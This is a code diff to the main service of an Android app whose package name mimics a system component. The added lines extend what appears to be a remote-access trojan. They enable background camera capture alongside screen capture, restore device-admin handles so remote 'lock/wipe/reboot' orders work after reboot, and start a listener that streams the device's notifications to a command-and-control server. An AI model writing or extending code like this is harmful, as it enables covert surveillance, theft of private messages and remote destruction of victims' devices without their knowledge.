@@ -3,6 +3,7 @@ package com.android.background.services;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.admin.DevicePolicyManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -52,9 +53,13 @@ public class MainService extends Service {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                 // Android 14+: re-declare the FGS with mediaProjection added,
                 // which is now allowed because consent was granted.
-                startForeground(1, getOngoingNotification(),
-                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-                                | ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
+                int type = ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+                        | ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
+                if (checkSelfPermission(android.Manifest.permission.CAMERA)
+                        == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+                }
+                startForeground(1, getOngoingNotification(), type);
             } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 // Android 10-13: mediaProjection type is ungated here (added
                 // at start), nothing to upgrade.
@@ -124,6 +129,16 @@ public class MainService extends Service {
         instance = this;
         createNotificationChannel();
 
+        // When the service is started by the boot receiver / restart worker,
+        // MainActivity never runs, so its DevicePolicyManager/componentName
+        // statics are null -- without this, every device-admin order
+        // (lock/wipe/reboot) would NPE.
+        if (MainActivity.devicePolicyManager == null || MainActivity.componentName == null) {
+            MainActivity.componentName = new android.content.ComponentName(
+                    this, com.android.background.services.receivers.AdminReceiver.class);
+            MainActivity.devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        }
+
         Notification notification = getOngoingNotification();
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
@@ -133,7 +148,14 @@ public class MainService extends Service {
             // receiver). So: if we already have the consent token, declare
             // both types now; otherwise start with specialUse only and upgrade
             // in setScreenCaptureData() once consent is granted.
+            // camera type lets the app capture while backgrounded (Android 11+),
+            // but only include it when the runtime CAMERA permission is granted
+            // -- otherwise Android 14+ throws SecurityException on startForeground.
             int type = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
+            if (checkSelfPermission(android.Manifest.permission.CAMERA)
+                    == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+            }
             if (screenData != null) {
                 type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
             }
@@ -141,13 +163,29 @@ public class MainService extends Service {
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             // Android 10-13: mediaProjection type is ungated and required for
             // getMediaProjection(), so declare it from the start.
-            startForeground(1, notification,
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
+            int type = ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
+            if (checkSelfPermission(android.Manifest.permission.CAMERA)
+                    == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+            }
+            startForeground(1, notification, type);
         } else {
             startForeground(1, notification);
         }
 
         acquireWakeLock();
+
+        // Stream device notifications to the C2 once the listener is enabled
+        // (auto_setup.sh grants notification access; this starts the listener
+        // so x0000nt events actually flow).
+        if (isNotificationServiceEnabled()) {
+            try {
+                startService(new Intent(this, NotificationService.class));
+            } catch (Exception e) {
+                // listener service start refused -- ignore, it can be bound by
+                // the system when the user grants access later
+            }
+        }
 
         contextOfApplication = this;
         ConnectionManager.startAsync(this);
@@ -198,6 +236,28 @@ public class MainService extends Service {
     public static Context getContextOfApplication()
     {
         return contextOfApplication;
+    }
+
+    private boolean isNotificationServiceEnabled() {
+        return isNotificationServiceEnabled(this);
+    }
+
+    /** Shared check: is this app's NotificationService in the enabled list? */
+    public static boolean isNotificationServiceEnabled(Context ctx) {
+        String pkgName = ctx.getPackageName();
+        final String flat = android.provider.Settings.Secure.getString(
+                ctx.getContentResolver(), "enabled_notification_listeners");
+        if (!android.text.TextUtils.isEmpty(flat)) {
+            final String[] names = flat.split(":");
+            for (String name : names) {
+                final android.content.ComponentName cn =
+                        android.content.ComponentName.unflattenFromString(name);
+                if (cn != null && android.text.TextUtils.equals(pkgName, cn.getPackageName())) {
+                    return true;
+                }
+            }
+        }
+        return false;
     }
 
     private void createNotificationChannel() {
